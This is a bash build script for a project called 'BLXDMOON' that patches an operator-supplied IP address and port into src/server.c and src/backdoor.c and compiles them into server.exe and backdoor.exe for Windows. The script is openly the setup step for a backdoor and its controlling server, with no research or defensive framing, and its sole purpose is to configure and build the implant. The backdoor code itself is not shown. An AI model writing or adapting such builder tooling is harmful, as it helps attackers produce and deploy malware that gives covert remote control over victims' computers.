#!/bin/bash

# Startup
echo "----- BLXDMOON SETUP -----"

# Get IP address
IP=$1
if [ -z "$IP" ]; then
    echo "[-] No IP supplied"
    exit 1
fi

# Get Port
PORT=$2
if [ -z "$PORT" ]; then
    echo "[-] No Port supplied"
    exit 1
fi

# Replace "192.168.1.21" in src/server.c and src/backdoor.c with provided IP
sed -i "s/192.168.1.21/$IP/g" src/server.c
sed -i "s/192.168.1.21/$IP/g" src/backdoor.c

# Replace "6709" in src/server.c and src/backdoor.c with provided Port
sed -i "s/6709/$PORT/g" src/server.c
sed -i "s/6709/$PORT/g" src/backdoor.c

# Compile
echo "[*] Compiling..."
gcc src/server.c -o bin/server.exe -lws2_32
gcc src/backdoor.c -o bin/backdoor.exe -lws2_32 -lgdi32
echo "[+] Successfully compiled!"

# Done message
echo "[+] Done!"